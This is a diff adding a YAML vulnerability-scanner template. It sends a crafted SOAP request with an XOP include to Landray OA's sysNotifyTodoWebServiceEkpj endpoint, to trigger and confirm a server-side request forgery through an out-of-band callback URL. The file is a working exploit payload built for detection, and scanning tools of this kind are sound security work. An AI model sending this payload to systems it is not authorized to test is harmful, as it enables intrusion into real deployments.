@@ -1,0 +1,44 @@
+id: poc-yaml-landray-sysnotifytodowebserviceekpj-ssrf
+info:
+  name: Landray OA sysNotifyTodoWebServiceEkpj SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /sys/webservice/sysNotifyTodoWebServiceEkpj HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://ekpj.webservice.notify.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getAllTodoId>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://{{reverse}}"/></count>
+                </arg0>
+            </web:getAllTodoId>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "意外的文本"
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
